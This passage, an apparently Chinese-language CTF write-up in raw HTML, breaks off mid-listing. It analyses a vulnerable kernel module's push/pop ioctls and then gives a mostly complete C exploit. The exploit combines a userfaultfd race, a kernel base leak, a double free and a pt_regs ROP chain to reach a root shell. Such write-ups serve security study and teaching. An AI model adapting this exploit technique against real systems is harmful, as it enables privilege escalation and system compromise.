class="type">void</span>            *unknown;</span><br><span class="line">    <span class="type">char</span>             data[<span class="number">8</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span>     *<span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>该结构体前八个字节是从 <code>current_task</code> 的某个特殊偏移取的值，经尝试可知为线程组 id</p><p>分配的大小是32</p><p>如果拷贝失败会立即释放obj</p><p><strong>0x57AC0002</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a2 != <span class="number">0x57AC0002</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    v5 = head;</span><br><span class="line">    <span class="keyword">if</span> ( !head )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v4 == *(_DWORD *)head )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !copy_to_user(a3, head + <span class="number">8</span>, <span class="number">8LL</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        v6 = v5;</span><br><span class="line">        head = *(_QWORD *)(v5 + <span class="number">16</span>);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v6 = *(_QWORD *)(head + <span class="number">16</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v6 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( *(_DWORD *)v6 != v4 )</span><br><span class="line">        &#123;</span><br><span class="line">          v5 = v6;</span><br><span class="line">          <span class="keyword">if</span> ( !*(_QWORD *)(v6 + <span class="number">16</span>) )</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">          v6 = *(_QWORD *)(v6 + <span class="number">16</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( !copy_to_user(a3, v6 + <span class="number">8</span>, <span class="number">8LL</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          *(_QWORD *)(v5 + <span class="number">16</span>) = *(_QWORD *)(v6 + <span class="number">16</span>);</span><br><span class="line">LABEL_12:</span><br><span class="line">          kfree(v6);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>会将同一线程组创建的节点中的头节点删除，并将其 data 拷贝给用户</p><p>若并节点所属线程组与当前进程非同一线程组，则会一直找到那个线程组的节点或是遍历结束为止</p><p>综合来看是实现了一个栈的结构两个功能分别为push和pop</p><h3 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h3><p>ioctl操作没有上锁,以及操作过程中出现的<code>copy_from/to_user</code>,无疑让我们能够想到利用usserfaultfd进行条件竞争</p><p>具体流程如下</p><ol><li>注册一个userfaultfd,监控一块内存<code>leak_page</code>,用以接下来的泄露</li><li>使用shm相关调用,分配并释放一个shm_file_data结构体,从而获得了一个obj+8存在一个内核<code>.text</code>段基址的obj</li><li>调用push来申请一个obj,刚好是先前的shm结构体,但是因为之前注册的userfaultfd,使得停在copy_from_user处,从而没有覆盖obj+8,在注册的监控线程中调用pop操作,使得shm的内容被泄露出来</li><li>注册一个userfaultfd,监控一块内存<code>double_page</code>,用以构造double free</li><li>执行一次push操作,再执行一次pop操作,触发userfaultfd,在监控线程其中再一次pop,构造double free</li><li>注册一个userfaultfd,监控一块内存<code>hijack_page</code>,用以劫持流</li><li>打开一个seq对象,让其取出一个kmalloc-32</li><li>调用setxattr,申请一个kmalloc-32,拷贝的页面横跨两个page,从而使得在拷贝过程中触发userfaultfd,在监控线程中,构造pt_regs并触发</li></ol><p><strong>exp:</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/xattr.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernelpwn.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span>             dev_fd;</span><br><span class="line"><span class="type">size_t</span>          seq_fd;</span><br><span class="line"><span class="type">size_t</span>          seq_fd_reserve[<span class="number">0x100</span>];</span><br><span class="line"><span class="type">static</span> <span class="type">char</span>     *page = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">size_t</span>   page_size;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *</span><br><span class="line"><span class="title function_">leak_thread</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="type">int</span> fault_cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="type">long</span> uffd;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">    <span class="type">ssize_t</span> nread;</span><br><span class="line"></span><br><span class="line">    uffd = (<span class="type">long</span>) arg;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        <span class="type">int</span> nready;</span><br><span class="line">        pollfd.fd = uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nready == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;poll&quot;</span>);</span><br><span class="line"></span><br><span class="line">        nread = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;EOF on userfaultfd!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;read&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)</span><br><span class="line">            errExit(<span class="string">&quot;Unexpected event on userfaultfd\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] push trapped in userfaultfd.&quot;</span>);</span><br><span class="line">        pop(&amp;kernel_offset);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] leak ptr: %p\n&quot;</span>, kernel_offset);</span><br><span class="line">        kernel_offset -= <span class="number">0xffffffff81c37bc0</span>;</span><br><span class="line">        kernel_base += kernel_offset;</span><br><span class="line"></span><br><span class="line">        uffdio_copy.src = (<span class="type">unsigned</span> <span class="type">long</span>) page;</span><br><span class="line">        uffdio_copy.dst = (<span class="type">unsigned</span> <span class="type">long</span>) msg.arg.pagefault.address &amp;</span><br><span class="line">                                              ~(page_size - <span class="number">1</span>);</span><br><span class="line">        uffdio_copy.len = page_size;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;ioctl-UFFDIO_COPY&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *</span><br><span class="line"><span class="title function_">double_free_thread</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="type">int</span> fault_cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="type">long</span> uffd;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">    <span class="type">ssize_t</span> nread;</span><br><span class="line"></span><br><span class="line">    uffd = (<span class="type">long</span>) arg;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        <span class="type">int</span> nready;</span><br><span class="line">        pollfd.fd = uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nready == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;poll&quot;</span>);</span><br><span class="line"></span><br><span class="line">        nread = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;EOF on userfaultfd!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;read&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)</span><br><span class="line">            errExit(<span class="string">&quot;Unexpected event on userfaultfd\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] pop trapped in userfaultfd.&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] construct the double free...&quot;</span>);</span><br><span class="line">        pop(page);</span><br><span class="line"></span><br><span class="line">        uffdio_copy.src = (<span class="type">unsigned</span> <span class="type">long</span>) page;</span><br><span class="line">        uffdio_copy.dst = (<span class="type">unsigned</span> <span class="type">long</span>) msg.arg.pagefault.address &amp;</span><br><span class="line">                                              ~(page_size - <span class="number">1</span>);</span><br><span class="line">        uffdio_copy.len = page_size;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;ioctl-UFFDIO_COPY&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span>  pop_rdi_ret = <span class="number">0xffffffff81034505</span>;</span><br><span class="line"><span class="type">size_t</span>  xchg_rax_rdi_ret = <span class="number">0xffffffff81d8df6d</span>;</span><br><span class="line"><span class="type">size_t</span>  mov_rdi_rax_pop_rbp_ret = <span class="number">0xffffffff8121f89a</span>;</span><br><span class="line"><span class="type">size_t</span>  swapgs_restore_regs_and_return_to_usermode = <span class="number">0xffffffff81600a34</span>;</span><br><span class="line"><span class="type">long</span>    flag_fd;</span><br><span class="line"><span class="type">char</span>    flag_buf[<span class="number">0x100</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *</span><br><span class="line"><span class="title function_">hijack_thread</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="type">int</span> fault_cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="type">long</span> uffd;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">    <span class="type">ssize_t</span> nread;</span><br><span class="line"></span><br><span class="line">    uffd = (<span class="type">long</span>) arg;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        <span class="type">int</span> nready;</span><br><span class="line">        pollfd.fd = uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nready == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;poll&quot;</span>);</span><br><span class="line"></span><br><span class="line">        nread = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;EOF on userfaultfd!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;read&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)</span><br><span class="line">            errExit(<span class="string">&quot;Unexpected event on userfaultfd\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] setxattr trapped in userfaultfd.&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] trigger now...&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++)</span><br><span class="line">            close(seq_fd_reserve[i]);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// trigger</span></span><br><span class="line">        pop_rdi_ret += kernel_offset;</span><br><span class="line">        xchg_rax_rdi_ret += kernel_offset;</span><br><span class="line">        mov_rdi_rax_pop_rbp_ret += kernel_offset;</span><br><span class="line">        prepare_kernel_cred = <span class="number">0xffffffff81069e00</span> + kernel_offset;</span><br><span class="line">        commit_creds = <span class="number">0xffffffff81069c10</span> + kernel_offset;</span><br><span class="line">        swapgs_restore_regs_and_return_to_usermode += kernel_offset + <span class="number">0x10</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] gadget: %p\n&quot;</span>, swapgs_restore_regs_and_return_to_usermode);</span><br><span class="line">        __asm__(</span><br><span class="line">            <span class="string">&quot;mov r15,   0xbeefdead;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r14,   0x11111111;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r13,   pop_rdi_ret;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r12,   0;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rbp,   prepare_kernel_cred;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rbx,   mov_rdi_rax_pop_rbp_ret;&quot;</span>    </span><br><span class="line">            <span class="string">&quot;mov r11,   0x66666666;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r10,   commit_creds;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r9,    swapgs_restore_regs_and_return_to_usermode;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r8,    0x99999999;&quot;</span></span><br><span class="line">            <span class="string">&quot;xor rax,   rax;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rcx,   0xaaaaaaaa;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rdx,   8;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rsi,   rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rdi,   seq_fd;&quot;</span></span><br><span class="line">            <span class="string">&quot;syscall&quot;</span></span><br><span class="line">        );</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[+] back to userland successfully!&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] uid: %d gid: %d\n&quot;</span>, getuid(), getgid());</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] execve root shell now...&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">        uffdio_copy.src = (<span class="type">unsigned</span> <span class="type">long</span>) page;</span><br><span class="line">        uffdio_copy.dst = (<span class="type">unsigned</span> <span class="type">long</span>) msg.arg.pagefault.address &amp;</span><br><span class="line">                                              ~(page_size - <span class="number">1</span>);</span><br><span class="line">        uffdio_copy.len = page_size;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;ioctl-UFFDIO_COPY&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">push</span><span class="params">(<span class="type">char</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(dev_fd, <span class="number">0x57AC0001</span>, data) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;push!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pop</span><span class="params">(<span class="type">char</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(dev_fd, <span class="number">0x57AC0002</span>, data) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;pop!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span>      data[<span class="number">0x10</span>];</span><br><span class="line">    <span class="type">char</span>        *uffd_buf_leak;</span><br><span class="line">    <span class="type">char</span>        *uffd_buf_uaf;</span><br><span class="line">    <span class="type">char</span>        *uffd_buf_hack;</span><br><span class="line">    <span class="type">int</span>         pipe_fd[<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span>         shm_id;</span><br><span class="line">    <span class="type">char</span>        *shm_addr;</span><br><span class="line"></span><br><span class="line">    dev_fd = open(<span class="string">&quot;/proc/stack&quot;</span>, O_RDONLY);</span><br><span class="line"></span><br><span class="line">    page = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    page_size = sysconf(_SC_PAGE_SIZE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// reserve object to protect freelist</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++)</span><br><span class="line">        <span class="keyword">if</span> ((seq_fd_reserve[i] = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY)) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;seq reserve!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// create uffd thread for leak</span></span><br><span class="line">    uffd_buf_leak = (<span class="type">char</span>*) mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    registerUserFaultFd(uffd_buf_leak, page_size, leak_thread);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// left dirty data in kmalloc-32</span></span><br><span class="line">    shm_id = shmget(<span 